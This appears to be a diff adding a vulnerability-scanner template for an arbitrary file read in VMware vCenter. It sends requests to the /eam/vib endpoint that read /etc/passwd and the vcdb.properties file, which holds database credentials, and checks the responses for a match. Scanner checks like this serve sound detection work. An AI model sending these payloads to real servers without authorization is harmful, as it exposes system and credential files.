@@ -1,0 +1,16 @@
+name: vmware-vcenter-arbitrary-file-read-2
+groups:
+  linux:
+    - method: GET
+      path: "/eam/vib?id=/etc/passwd"
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  windows:
+    - method: GET
+      path: "/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"
+      expression: |
+        response.status == 200 && response.body.bcontains(b"org.postgresql.Driver")
+detail:
+  author: h1ei1
+  links:
+    - https://www.vmware.com/
